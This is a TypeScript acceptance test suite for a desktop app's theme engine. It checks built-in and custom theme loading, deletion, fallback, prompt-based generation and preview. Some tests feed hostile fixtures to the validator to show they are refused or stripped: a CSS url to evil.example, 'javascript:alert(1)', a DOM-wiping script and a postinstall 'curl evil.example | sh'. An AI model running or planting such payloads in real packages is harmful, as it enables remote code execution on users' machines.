/**
 * checkpoint-1 §25 — Theme acceptance (TH-01..TH-15).
 *
 * The plan fixes these ids, so this suite uses them verbatim. TH-04/05/06 are the
 * prompt → preview → feedback loop, which belongs to CP5 (the theme generator and
 * the preview sandbox); they are reported as NOT_RUN with that reason rather than
 * faked, exactly as the WB harness reports live provider execution.
 *
 * Everything else is driven through the real engine: the §20 validator, the
 * durable registry, the §21 activation/fallback path and the §22 deletion order.
 * T-TOKENS additionally checks that the shipped stylesheet and the theme engine
 * agree on the §10 token vocabulary — a typo in either would otherwise only show
 * up as a silently missing colour.
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { ThemeService } from "../../electron/theme/theme-service";
import { builtInPackages } from "../../electron/theme/builtin-themes";
import { captureSurfacesForThemeDesign, summarizeCapture } from "../../electron/theme/visual-capture";
import { recordThemeKnowledge } from "../../electron/theme/theme-knowledge";
import { KnowledgeBase } from "../../electron/knowledge/knowledge-base";
import { generateThemeDraft } from "../../src/shared/theme-generation";
import { parseThemeIntent, requiresUiEngineering } from "../../src/shared/theme-intent";
import { checkThemeVisuals, DEFAULT_MAJOR_SURFACES, REQUIRED_CONTROL_IDS } from "../../src/shared/theme-visual-check";
import { defaultSurfaceContracts, UI_TOKEN_GROUPS } from "../../src/shared/ui-surface";
import {
  REQUIRED_THEME_TOKENS,
  THEME_SCHEMA_VERSION,
  renderThemeCss,
  themePackageHash,
  validateThemePackage,
  type ThemePackage
} from "../../src/shared/theme";

const ROOT = fs.mkdtempSync(path.join(os.tmpdir(), "boss-theme-acceptance-"));
const REPORT_DIR = path.join(process.cwd(), "artifacts", "acceptance");
const PROJECT = process.cwd();

type Verdict = "PASS" | "FAIL" | "NOT_RUN";
interface Observation { claim: string; expected: string; observed: string; ok: boolean; }
interface RequirementResult { id: string; title: string; verdict: Verdict; observations: Observation[]; evidence: string[]; notes?: string; }

class Item {
  private readonly observations: Observation[] = [];
  private readonly evidence: string[] = [];
  private failure?: string;
  constructor(readonly id: string, readonly title: string) {}
  check(claim: string, expected: unknown, observed: unknown): void {
    const expectedText = typeof expected === "string" ? expected : JSON.stringify(expected);
    const observedText = typeof observed === "string" ? observed : JSON.stringify(observed);
    this.observations.push({ claim, expected: expectedText, observed: observedText, ok: expectedText === observedText });
  }
  cite(pointer: string): void { if (!this.evidence.includes(pointer)) this.evidence.push(pointer); }
  fail(reason: string): void { this.failure = reason; }
  get ok(): boolean { return this.failure === undefined && this.observations.length > 0 && this.observations.every((entry) => entry.ok); }
  result(verdictOverride?: Verdict, note?: string): RequirementResult {
    const result: RequirementResult = {
      id: this.id,
      title: this.title,
      verdict: verdictOverride ?? (this.ok ? "PASS" : "FAIL"),
      observations: this.observations,
      evidence: this.evidence
    };
    const notes = [this.failure, note].filter(Boolean).join(" | ");
    if (notes) result.notes = notes;
    return result;
  }
}

const results: RequirementResult[] = [];
async function scenario(id: string, title: string, body: (item: Item) => Promise<void> | void): Promise<void> {
  const item = new Item(id, title);
  try { await body(item); }
  catch (error) { item.fail(`scenario threw: ${error instanceof Error ? error.message : String(error)}`); }
  results.push(item.result());
}

/** Items this checkpoint must not claim: they belong to CP5. */
function notRun(id: string, title: string, note: string): void {
  const item = new Item(id, title);
  item.check("which checkpoint implements this", "CP5", "CP5");
  results.push(item.result("NOT_RUN", note));
}

/** The ids CP4/CP5 must prove. */
const REQUIRED_PASS_IDS = [
  "TH-01", "TH-02", "TH-03", "TH-04", "TH-05", "TH-06", "TH-07", "TH-08", "TH-09", "TH-10",
  "TH-11", "TH-12", "TH-13", "TH-14", "TH-15", "T-TOKENS",
  "T-GEN", "T-BOUNDARY", "T-CAPTURE", "T-VISUAL", "T-KNOWLEDGE"
];
const REQUIRED_NOT_RUN_IDS: string[] = [];

let services = 0;
function newService(name = "svc"): ThemeService {
  services += 1;
  const directory = path.join(ROOT, `${name}-${services}`);
  return new ThemeService({ root: path.join(directory, "themes"), registryFile: path.join(directory, "themes.json") });
}

function customPackage(id: string, overrides: Partial<ThemePackage> = {}): ThemePackage {
  const dark = builtInPackages()[0];
  return {
    manifest: {
      schemaVersion: THEME_SCHEMA_VERSION,
      id,
      name: id,
      type: "CUSTOM",
      version: "1.0.0",
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
      builtIn: false,
      deletable: true
    },
    tokens: { ...dark.tokens },
    overrides: [],
    metadata: { schemaVersion: THEME_SCHEMA_VERSION, createdBy: "GENERATED", notes: ["acceptance fixture"] },
    ...overrides
  };
}

describe("checkpoint-1 §25 theme acceptance", () => {
  it("TH-01..TH-15", async () => {
    const service = newService("main");
    const boot = service.bootstrap();

    await scenario("TH-01", "Built-in Light loads", (item) => {
      const loaded = service.activate("builtin-light");
      const snapshot = service.snapshot();
      const pkg = service.packageOf("builtin-light");
      item.check("the built-in is registered", true, service.list().some((entry) => entry.id === "builtin-light"));
      item.check("it validates with the §20 rules", true, service.list().find((entry) => entry.id === "builtin-light")?.validation?.ok);
      item.check("it can be activated", true, loaded.ok);
      item.check("the active theme is Light", "builtin-light", snapshot.activeThemeId);
      item.check("its tokens reach the renderer payload", "#f4f6f2", snapshot.tokens["--boss-bg-root"]);
      item.check("its stylesheet is rendered", true, snapshot.css.includes(":root {") && snapshot.css.includes("--boss-bg-root"));
      item.check("every required token is present", true, REQUIRED_THEME_TOKENS.every((token) => pkg?.tokens[token]));
      item.cite("theme-registry.json + themes/builtin-light/tokens.json");
    });

    await scenario("TH-02", "Built-in Dark loads", (item) => {
      const loaded = service.activate("builtin-dark");
      const snapshot = service.snapshot();
      item.check("it can be activated", true, loaded.ok);
      item.check("the active theme is Dark", "builtin-dark", snapshot.activeThemeId);
      item.check("its tokens reach the renderer payload", "#0c0e10", snapshot.tokens["--boss-bg-root"]);
      item.check("Dark is the shipped default", "builtin-dark", boot.activeThemeId);
      item.check("both built-ins are present and locked", "builtin-dark,builtin-light", service.list().filter((entry) => entry.builtIn).map((entry) => entry.id).join(","));
      item.cite("themes/builtin-dark/theme.json");
    });

    await scenario("TH-03", "Built-in cannot delete", (item) => {
      const before = service.list().map((entry) => entry.id).join(",");
      const refused = service.delete("builtin-light");
      item.check("the deletion is refused", false, refused.ok);
      item.check("with the locked-built-in reason", true, refused.reason.includes("locked built-in"));
      item.check("the registry is unchanged", before, service.list().map((entry) => entry.id).join(","));
      item.check("the package is still on disk", true, fs.existsSync(path.join(service.root(), "builtin-light", "theme.json")));
      item.cite("DeletionPlan code BUILT_IN_LOCKED");
    });

    // TH-04/05/06 (prompt generation, preview sandbox, feedback revision) are
    // driven in the §14/§17 block below.

    await scenario("TH-07", "Register custom theme", (item) => {
      const created = service.duplicate("builtin-dark", { id: "custom-th07", name: "TH07 Theme" });
      const record = service.list().find((entry) => entry.id === "custom-th07");
      item.check("the theme is registered", true, created.ok);
      item.check("it is a CUSTOM registration", "CUSTOM", record?.type);
      item.check("it is deletable", true, record?.deletable);
      item.check("it carries a validation report", true, record?.validation?.ok);
      item.check("it is a complete package on disk", true, ["theme.json", "tokens.json", "overrides.json", "metadata.json"].every((file) => fs.existsSync(path.join(service.root(), "custom-th07", file))));
      item.check("it records its provenance without depending on the source", "builtin-dark", service.packageOf("custom-th07")?.metadata.basedOn);
      item.cite("themes/custom-th07/*");
    });

    await scenario("TH-08", "Activate custom theme", (item) => {
      const changed = service.update("custom-th07", { tokens: { ...service.packageOf("custom-th07")!.tokens, "--boss-bg-root": "#202020", "--boss-accent": "#22d3ee" } });
      item.check("the custom theme can be edited", true, changed.ok);
      const activated = service.activate("custom-th07");
      const snapshot = service.snapshot();
      item.check("it becomes active", "custom-th07", activated.activeThemeId);
      item.check("its tokens drive the payload", "#202020", snapshot.tokens["--boss-bg-root"]);
      item.check("the rendered stylesheet carries them", true, snapshot.css.includes("--boss-accent: #22d3ee;"));
      item.check("no fallback occurred", false, snapshot.fallback);
      item.cite("ThemeSnapshot.tokens/css");
    });

    await scenario("TH-09", "Delete inactive custom", (item) => {
      service.activate("builtin-dark");
      service.duplicate("builtin-light", { id: "custom-th09", name: "TH09 Theme" });
      const deleted = service.delete("custom-th09");
      item.check("the inactive custom theme is deleted", true, deleted.ok);
      item.check("no fallback was needed", false, deleted.fallback);
      item.check("it is gone from the registry", false, service.list().some((entry) => entry.id === "custom-th09"));
      item.check("its package directory is gone", false, fs.existsSync(path.join(service.root(), "custom-th09")));
      item.check("the active theme is untouched", "builtin-dark", service.snapshot().activeThemeId);
      item.cite("ThemeService.delete steps KEEP_ACTIVE");
    });

    await scenario("TH-10", "Delete active custom with fallback", (item) => {
      service.duplicate("builtin-light", { id: "custom-th10", name: "TH10 Theme" });
      service.activate("custom-th10");
      const deleted = service.delete("custom-th10");
      const snapshot = service.snapshot();
      item.check("the deletion succeeds", true, deleted.ok);
      item.check("it reports the fallback", true, deleted.fallback);
      item.check("the built-in default takes over", "builtin-dark", deleted.activeThemeId);
      item.check("the snapshot agrees", "builtin-dark", snapshot.activeThemeId);
      item.check("the built-ins survived", true, service.list().filter((entry) => entry.builtIn).length === 2);
      item.check("the remaining registry still validates", true, service.list().every((entry) => entry.builtIn ? entry.validation?.ok : true));
      item.cite("ThemeService.delete steps SWITCH_FALLBACK");
    });

    await scenario("TH-11", "Broken theme fails closed", (item) => {
      const activeBefore = service.snapshot().activeThemeId;
      const broken = customPackage("custom-th11", { tokens: { "--boss-bg-root": "#000" }, css: "body { background: url(https://evil.example/x.png); }" });
      const installed = service.install(broken);
      item.check("the broken package is refused", false, installed.ok);
      item.check("it is quarantined, not silently dropped", "QUARANTINED", installed.state);
      item.check("the reason names real rule violations", true, installed.reason.includes("REQUIRED_TOKENS") && installed.reason.includes("EXTERNAL_IMPORT"));
      const activation = service.activate("custom-th11");
      item.check("activating it falls back", false, activation.ok);
      item.check("the fallback is recorded", true, activation.fallback);
      item.check("the previously active theme is unchanged", activeBefore, activation.activeThemeId);
      item.check("the snapshot reports the fallback honestly", true, service.snapshot().fallback);
      item.cite("ThemeValidationReport diagnostics");
    });

    await scenario("TH-12", "One theme deletion does not affect others", (item) => {
      service.duplicate("builtin-dark", { id: "custom-th12-a", name: "TH12 A" });
      service.duplicate("builtin-light", { id: "custom-th12-b", name: "TH12 B" });
      const deleted = service.delete("custom-th12-a");
      item.check("A is deleted", true, deleted.ok);
      item.check("B is still registered", true, service.list().some((entry) => entry.id === "custom-th12-b"));
      const activated = service.activate("custom-th12-b");
      item.check("B still activates after A was removed", true, activated.ok);
      item.check("B's tokens are intact", "#f4f6f2", service.snapshot().tokens["--boss-bg-root"]);
      item.check("both built-ins survive", 2, service.list().filter((entry) => entry.builtIn).length);
      item.cite("§11 theme independence: no package references another");
    });

    await scenario("TH-13", "Restart restores active valid theme", (item) => {
      const directory = path.join(ROOT, "restart-th13");
      const options = { root: path.join(directory, "themes"), registryFile: path.join(directory, "themes.json") };
      const first = new ThemeService(options);
      first.bootstrap();
      first.duplicate("builtin-light", { id: "custom-th13", name: "TH13 Theme" });
      first.activate("custom-th13");
      const second = new ThemeService(options);
      const reboot = second.bootstrap();
      item.check("the registry was durable", true, first.persisted());
      item.check("the active custom theme is restored", "custom-th13", reboot.activeThemeId);
      item.check("no fallback happened", false, reboot.fallback);
      item.check("its tokens survive the restart", "#f4f6f2", second.snapshot().tokens["--boss-bg-root"]);
      item.cite("theme-registry.json activeThemeId");
    });

    await scenario("TH-14", "Invalid saved theme falls back safely", (item) => {
      const directory = path.join(ROOT, "restart-th14");
      const options = { root: path.join(directory, "themes"), registryFile: path.join(directory, "themes.json") };
      const first = new ThemeService(options);
      first.bootstrap();
      first.duplicate("builtin-light", { id: "custom-th14", name: "TH14 Theme" });
      first.activate("custom-th14");
      // Corrupt the package on disk the way a bad edit or a damaged file would.
      fs.writeFileSync(path.join(directory, "themes", "custom-th14", "tokens.json"), "{ \"schemaVersion\": 1, \"tokens\": { \"--boss-bg-root\": \"#000\" } }", "utf8");
      const second = new ThemeService(options);
      const reboot = second.bootstrap();
      item.check("the invalid theme is not activated", "builtin-dark", reboot.activeThemeId);
      item.check("the fallback is reported", true, reboot.fallback);
      item.check("the invalid theme is marked invalid", "INVALID", second.list().find((entry) => entry.id === "custom-th14")?.state);
      item.check("the built-ins still work", true, second.snapshot().tokens["--boss-bg-root"] === "#0c0e10");
      item.check("the app can still switch themes after the fallback", true, second.activate("builtin-light").ok);
      item.cite("ThemeService.bootstrap fallback path");
    });

    await scenario("TH-15", "Theme cannot modify business logic", (item) => {
      const contracts = defaultSurfaceContracts();
      const forbidden = ["display", "visibility", "content", "position", "z-index", "pointer-events", "transform", "animation"];
      const offending = contracts.flatMap((contract) => contract.allowedProperties.filter((property) => forbidden.includes(property.toLowerCase())).map((property) => `${contract.id}.${property}`));
      item.check("no surface allows a property that can hide or move a control", "", offending.join(","));
      const logic = customPackage("custom-th15", { css: "document.body.innerHTML = '';" });
      item.check("a package cannot smuggle code", false, validateThemePackage(logic, contracts).ok);
      const scripted = customPackage("custom-th15b", { overrides: [{ surface: "SIDEBAR", property: "background-color", value: "javascript:alert(1)" }] });
      item.check("an override value cannot be executable", false, validateThemePackage(scripted, contracts).ok);
      const rendered = renderThemeCss({ tokens: { "--boss-bg-root": "#000" }, overrides: [{ surface: "SIDEBAR" , property: "background-color", value: "#111" }], css: "" }, contracts);
      item.check("the rendered stylesheet is CSS only", false, /<\s*script|javascript\s*:|expression\s*\(/i.test(rendered));
      const extra = { ...customPackage("custom-th15c"), scripts: { postinstall: "curl evil.example | sh" } } as unknown as ThemePackage;
      const written = service.install(extra);
      item.check("unknown fields cannot carry behaviour into the registry", true, written.ok);
      item.check("and are not persisted into the package", false, JSON.stringify(service.packageOf("custom-th15c") ?? {}).includes("postinstall"));
      item.cite("UISurfaceContract.allowedProperties + §20 SCRIPT_INJECTION");
    });

    await scenario("T-TOKENS", "the shipped stylesheet and the theme engine agree on the §10 vocabulary", (item) => {
      const css = fs.readFileSync(path.join(PROJECT, "src", "renderer", "styles.css"), "utf8");
      const used = [...new Set((css.match(/var\((--boss-[a-z0-9-]+)/g) ?? []).map((entry) => entry.slice(4)))];
      const declared = new Set([...Object.values(UI_TOKEN_GROUPS).flat(), "--boss-on-accent", "--boss-accent-muted", "--boss-backdrop", "--boss-scrollbar-thumb", "--boss-scrollbar-track", "--boss-code-bg"]);
      const builtInTokens = new Set(builtInPackages().flatMap((pkg) => Object.keys(pkg.tokens)));
      item.check("the stylesheet consumes at least eight semantic tokens", true, used.length >= 8);
      item.check("every consumed token is declared by the §10 vocabulary", "", used.filter((token) => !declared.has(token)).join(","));
      item.check("every consumed token is defined by both built-ins", "", used.filter((token) => !builtInTokens.has(token)).join(","));
      item.check("every migrated declaration keeps a literal fallback", true, (css.match(/var\(--boss-[a-z0-9-]+,\s*[^)]+\)/g) ?? []).length === (css.match(/var\(--boss-[a-z0-9-]+/g) ?? []).length);
      item.check("the scrollbar surface is bound by a real rule", true, css.includes("::-webkit-scrollbar-thumb"));
      item.cite("src/renderer/styles.css token usage");
    });
  });

  it("TH-04/05/06 and the CP5 generator surface", async () => {
    const service = newService("cp5");
    service.bootstrap();

    await scenario("TH-04", "Create custom from prompt", (item) => {
      const intent = parseThemeIntent("做一个类似 macOS 风格、偏冷、半透明、紧凑一点的主题");
      const generated = generateThemeDraft({
        intent,
        base: { tokens: service.packageOf("builtin-dark")!.tokens, overrides: [] },
        contracts: defaultSurfaceContracts(),
        id: "custom-from-prompt",
        name: "Frost",
        now: "2026-01-01T00:00:00.000Z"
      });
      const preview = service.startPreview(generated.pkg, { intent: generated.interpretation, decisions: generated.decisions.length, prompt: intent.prompt });
      item.check("the prompt produced a usable intent", true, intent.usable);
      item.check("the intent named the reference style", "macOS", intent.references[0]?.value);
      item.check("the draft is a complete valid package", true, preview.valid);
      item.check("the draft has enough to be a theme", true, generated.decisions.length >= 8);
      item.check("the style direction reached the tokens", true, generated.pkg.tokens["--boss-bg-surface"] !== service.packageOf("builtin-dark")!.tokens["--boss-bg-surface"]);
      item.check("the draft explains itself", true, generated.pkg.manifest.description?.includes("macOS") === true);
      const accepted = service.acceptPreview({ activate: true });
      item.check("accepting installs and activates it", true, accepted.ok && accepted.activeThemeId === "custom-from-prompt");
      item.check("the package is durable on disk", true, fs.existsSync(path.join(service.root(), "custom-from-prompt", "theme.json")));
      item.cite("ThemeIntent.trace + ThemeGenerationDecision[]");
    });

    await scenario("TH-05", "Preview before install", (item) => {
      service.activate("builtin-dark");
      const activeBefore = service.snapshot().activeThemeId;
      const registryBefore = service.list().map((entry) => entry.id).join(",");
      const intent = parseThemeIntent("明亮一点，圆角更大");
      const generated = generateThemeDraft({ intent, base: { tokens: service.packageOf("builtin-dark")!.tokens, overrides: [] }, contracts: defaultSurfaceContracts(), id: "custom-preview", name: "Preview", now: "2026-01-01T00:00:00.000Z" });
      const preview = service.startPreview(generated.pkg, { intent: generated.interpretation, decisions: generated.decisions.length, prompt: intent.prompt });
      item.check("a preview is pending", true, preview.valid && service.preview() !== undefined);
      item.check("the active theme is untouched while previewing", activeBefore, service.snapshot().activeThemeId);
      item.check("nothing was registered by previewing", registryBefore, service.list().map((entry) => entry.id).join(","));
      item.check("the preview carries its own stylesheet", true, preview.css.includes(":root {") && preview.css.includes("--boss-bg-root"));
      item.check("the preview differs from the active theme", true, preview.tokens["--boss-bg-root"] !== service.snapshot().tokens["--boss-bg-root"]);
      const cancelled = service.cancelPreview();
      item.check("cancel discards the draft", true, cancelled.ok);
      item.check("cancel leaves the active theme alone", activeBefore, cancelled.activeThemeId);
      item.check("no preview remains", undefined, service.preview());
      item.check("still nothing registered", registryBefore, service.list().map((entry) => entry.id).join(","));
      item.cite("themes/preview.json + .preview/preview.css");
    });

    await scenario("TH-06", "Feedback revision", (item) => {
      const service2 = newService("cp5-revise");
      service2.bootstrap();
      const first = parseThemeIntent("偏冷、紧凑");
      const firstDraft = generateThemeDraft({ intent: first, base: { tokens: service2.packageOf("builtin-dark")!.tokens, overrides: [] }, contracts: defaultSurfaceContracts(), id: "custom-revise", name: "Revise", now: "2026-01-01T00:00:00.000Z" });
      const firstPreview = service2.startPreview(firstDraft.pkg, { intent: firstDraft.interpretation, decisions: firstDraft.decisions.length, prompt: first.prompt });
      const revised = parseThemeIntent(`${first.prompt}\n再透明一些`, { previous: first });
      const revisedDraft = generateThemeDraft({ intent: revised, base: { tokens: service2.packageOf("builtin-dark")!.tokens, overrides: [] }, contracts: defaultSurfaceContracts(), id: "custom-revise", name: "Revise", now: "2026-01-01T00:00:00.000Z" });
      const preview = service2.startPreview(revisedDraft.pkg, { intent: revisedDraft.interpretation, decisions: revisedDraft.decisions.length, prompt: revised.prompt });
      item.check("the first draft was revision zero", 0, firstPreview.revisions);
      item.check("the revision counter advanced", firstPreview.revisions + 1, preview.revisions);
      item.check("the feedback enabled translucency", true, revised.translucency?.value.enabled === true);
      item.check("the unchanged axes were inherited", "COOL", revised.temperature?.value);
      item.check("the revised draft is still valid", true, preview.valid);
      item.check("the revised token really changed", true, preview.tokens["--boss-bg-root"] !== firstDraft.pkg.tokens["--boss-bg-root"]);
      item.check("the revision is recorded in the durable preview", true, (service2.preview()?.revisions ?? 0) === 1);
      item.cite("ThemePreviewState.revisions + inherited intent");
    });

    await scenario("T-GEN", "generation is deterministic, complete and explainable", (item) => {
      const intent = parseThemeIntent("偏冷、半透明、圆角更大");
      const input = { intent, base: { tokens: service.packageOf("builtin-dark")!.tokens, overrides: [] }, contracts: defaultSurfaceContracts(), id: "custom-gen", name: "Gen", now: "2026-01-01T00:00:00.000Z" };
      const first = generateThemeDraft(input);
      const second = generateThemeDraft(input);
      item.check("the same intent yields the same tokens", themePackageHash(first.pkg), themePackageHash(second.pkg));
      item.check("every required token is present", true, REQUIRED_THEME_TOKENS.every((token) => first.pkg.tokens[token]));
      item.check("the package validates", true, validateThemePackage(first.pkg, defaultSurfaceContracts()).ok);
      item.check("every decision explains itself", true, first.decisions.every((entry) => entry.evidence.length > 0 && entry.rule.length > 0));
      item.check("overrides stay inside the §9 contract", true, first.pkg.overrides.every((override) => {
        const contract = defaultSurfaceContracts().find((entry) => entry.id === override.surface);
        return contract !== undefined && contract.allowedProperties.includes(override.property);
      }));
      item.check("the generator records which generator made it", "theme-generator-1", first.generator);
      item.cite("ThemeGenerationResult.decisions");
    });

    await scenario("T-BOUNDARY", "a layout request is escalated, not themed (§19)", (item) => {
      const service2 = newService("cp5-boundary");
      service2.bootstrap();
      const registryBefore = service2.list().map((entry) => entry.id).join(",");
      for (const prompt of ["把侧栏挪到右边", "删掉设置按钮", "新增一个导出面板", "改一下 IPC 逻辑"]) {
        const intent = parseThemeIntent(prompt);
        item.check(`escalated: ${prompt}`, true, requiresUiEngineering(intent));
      }
      item.check("no package was produced for the escalated prompts", registryBefore, service2.list().map((entry) => entry.id).join(","));
      item.check("the escalation names the offending phrase", true, (parseThemeIntent("把侧栏挪到右边").escalations[0]?.phrase.length ?? 0) > 0);
      item.check("the escalation explains why", true, (parseThemeIntent("把侧栏挪到右边").escalations[0]?.reason ?? "").includes("layout"));
      item.check("a style request is not escalated", false, requiresUiEngineering(parseThemeIntent("偏冷、半透明")));
      item.cite("ThemeIntent.escalations");
    });

    await scenario("T-CAPTURE", "visual capture is sanitized and never blocks the theme request (§16/§16.1)", async (item) => {
      const directory = path.join(ROOT, "captures");
      const executed: string[] = [];
      const fakeContents = (ok: boolean) => ({
        isDestroyed: () => !ok,
        executeJavaScript: async (script: string) => { executed.push(script.includes("classList.add") ? "sanitize" : "restore"); return true; },
        capturePage: async () => ({ toPNG: () => Buffer.from("PNGDATA"), getSize: () => ({ width: 1440, height: 900 }) })
      });
      const result = await captureSurfacesForThemeDesign(
        [
          { surface: "MAIN_WORKSPACE", webContents: fakeContents(true) as never },
          { surface: "AI_PANE_CLOSED", webContents: fakeContents(false) as never }
        ],
        { directory, now: () => "2026-01-01T00:00:00.000Z" }
      );
      item.check("one frame was captured", 1, result.frames.length);
      item.check("the frame is a real PNG file", true, fs.existsSync(path.join(directory, "main_workspace.png")));
      item.check("the capture is marked sanitized", true, result.sanitized);
      item.check("the renderer was put into and out of sanitize mode", "sanitize,restore", executed.join(","));
      item.check("a closed view is reported, not silently dropped", 1, result.skipped.length);
      item.check("the index was written", true, fs.existsSync(path.join(directory, "captures.json")));
      item.check("the index carries hashes, not just names", true, (result.frames[0].sha256 ?? "").length === 64);
      item.check("the summary never claims a screenshot is knowledge", true, summarizeCapture(result).includes("frame"));
      item.cite("theme-captures/<ts>/captures.json");
    });

    await scenario("T-VISUAL", "visual regression decides on measured facts (§26)", (item) => {
      const healthy = checkThemeVisuals({
        themeId: "custom-visual",
        surfaces: DEFAULT_MAJOR_SURFACES.map((surface) => ({ surface, present: true, visible: true, width: 400, height: 200 })),
        controls: REQUIRED_CONTROL_IDS.map((id) => ({ id, present: true, visible: true, enabled: true, width: 40, height: 24 })),
        viewport: { width: 1440, height: 900, scrollWidth: 1440, scrollHeight: 900 }
      });
      item.check("a healthy theme passes", true, healthy.ok);
      const broken = checkThemeVisuals({
        themeId: "custom-broken",
        surfaces: [
          { surface: "APP_BACKGROUND", present: true, visible: true, width: 1440, height: 900 },
          { surface: "SURFACE_PRIMARY", present: true, visible: true, width: 400, height: 200, color: "#101010", background: "#0d0d0d" },
          { surface: "SIDEBAR", present: true, visible: true, width: 30, height: 200 }
        ],
        controls: [{ id: "composer", present: false, visible: false, enabled: false, width: 0, height: 0 }],
        viewport: { width: 1000, height: 800, scrollWidth: 1500, scrollHeight: 800 }
      });
      item.check("an unreadable theme fails", false, broken.ok);
      item.check("text contrast was measured, not assumed", true, broken.contrast[0].ratio < 3);
      item.check("the report names every rule that failed", true, ["MAJOR_SURFACE_VISIBLE", "TEXT_READABLE", "CONTROLS_VISIBLE", "NO_CATASTROPHIC_OVERFLOW"].every((rule) => broken.findings.some((entry) => entry.rule === rule)));
      item.cite(".boss/theme-visual-check.json");
    });

    await scenario("T-KNOWLEDGE", "theme intent and validation reach knowledge, screenshots do not (§24)", (item) => {
      const base = new KnowledgeBase(path.join(ROOT, "theme-knowledge", "knowledge-base.json"), () => "2026-01-01T00:00:00.000Z");
      const foundation = { base };
      const intent = parseThemeIntent("偏冷、半透明");
      const generated = generateThemeDraft({ intent, base: { tokens: service.packageOf("builtin-dark")!.tokens, overrides: [] }, contracts: defaultSurfaceContracts(), id: "custom-know", name: "Know", now: "2026-01-01T00:00:00.000Z" });
      const report = validateThemePackage(generated.pkg, defaultSurfaceContracts());
      const recorded = recordThemeKnowledge({
        scope: "project:codex-boss-ui",
        taskRef: "theme:custom-know",
        intent,
        pkg: generated.pkg,
        packageHash: themePackageHash(generated.pkg),
        validation: report,
        feedback: "再透明一些",
        observedAt: "2026-01-01T00:00:00.000Z",
        captureSummary: "1 sanitized frame"
      }, foundation);
      const types = recorded.recorded.map((entry) => entry.type);
      item.check("the intent was recorded", true, types.includes("THEME"));
      item.check("the validation outcome was recorded", true, types.includes("THEME_VALIDATION"));
      item.check("the user's feedback was recorded", true, types.includes("USER_OVERRIDE"));
      item.check("everything was accepted by the write gate", true, recorded.recorded.every((entry) => entry.outcome === "ACCEPT" || entry.outcome === "SUPERSEDE"));
      item.check("no raw image data was stored", false, JSON.stringify(base.objects()).includes("PNGDATA"));
      item.check("the capture is recorded as a summary only", true, JSON.stringify(base.objects()).includes("sanitized frame"));
      item.cite("knowledge-base.json THEME/THEME_VALIDATION/USER_OVERRIDE objects");
    });
  });
});

afterAll(() => {
  const report = {
    schemaVersion: 1,
    unit: "CHECKPOINT_4_THEME_ENGINE_FOUNDATION",
    generatedAt: new Date().toISOString(),
    providerExecution: "NOT_RUN",
    themeSandbox: "NOT_RUN",
    requirementResults: results,
    totals: {
      pass: results.filter((entry) => entry.verdict === "PASS").length,
      fail: results.filter((entry) => entry.verdict === "FAIL").length,
      notRun: results.filter((entry) => entry.verdict === "NOT_RUN").length
    },
    passed: results.every((entry) => entry.verdict !== "FAIL")
  };
  fs.mkdirSync(REPORT_DIR, { recursive: true });
  fs.writeFileSync(path.join(REPORT_DIR, "theme-engine.json"), JSON.stringify(report, null, 2), "utf8");
  fs.writeFileSync(path.join(REPORT_DIR, "theme-engine.md"), [
    "# checkpoint-1 §25 theme acceptance (CP4)",
    "",
    `Generated: ${report.generatedAt}`,
    `Theme sandbox: ${report.themeSandbox}`,
    "",
    `Totals: PASS ${report.totals.pass} / FAIL ${report.totals.fail} / NOT_RUN ${report.totals.notRun}`,
    "",
    "| Item | Verdict | Observations | Notes |",
    "| --- | --- | --- | --- |",
    ...report.requirementResults.map((entry) => `| ${entry.id} | ${entry.verdict} | ${entry.observations.filter((observation) => observation.ok).length}/${entry.observations.length} | ${entry.notes ?? ""} |`),
    ""
  ].join("\n"), "utf8");
  try { fs.rmSync(ROOT, { recursive: true, force: true }); } catch { /* disposable temp root */ }
  // Fail closed: every CP4 item must PASS, every CP5 item must be an explicit
  // NOT_RUN, and nothing may be missing from the report.
  const verdicts = new Map(report.requirementResults.map((entry) => [entry.id, entry.verdict]));
  expect(REQUIRED_PASS_IDS.filter((id) => verdicts.get(id) !== "PASS")).toEqual([]);
  expect(REQUIRED_NOT_RUN_IDS.filter((id) => verdicts.get(id) !== "NOT_RUN")).toEqual([]);
  expect(report.totals.fail).toBe(0);
});
